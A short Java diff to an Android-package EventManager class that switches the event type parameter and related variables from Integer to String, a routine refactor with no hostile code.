@@ -18,7 +18,7 @@ import com.android.service.util.Check;
 /**
  * The Class EventManager.
  */
-public class EventManager extends Manager<EventBase, Integer, Integer> {
+public class EventManager extends Manager<EventBase, Integer, String> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventManager"; //$NON-NLS-1$
 
@@ -51,7 +51,7 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private EventBase createEvent(final Integer type, final EventConf conf) {
+	private EventBase createEvent(final String type, final EventConf conf) {
 
 		if (running.containsKey(conf.getId()) == true) {
 			return running.get(type);
@@ -97,7 +97,7 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 			final Map.Entry<Integer, EventConf> pairs = it.next();
 
 			final EventConf conf = pairs.getValue();
-			final Integer type = conf.getType();
+			final String type = conf.getType();
 			
 			if (Cfg.DEBUG) {
 				Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping"); //$NON-NLS-1$
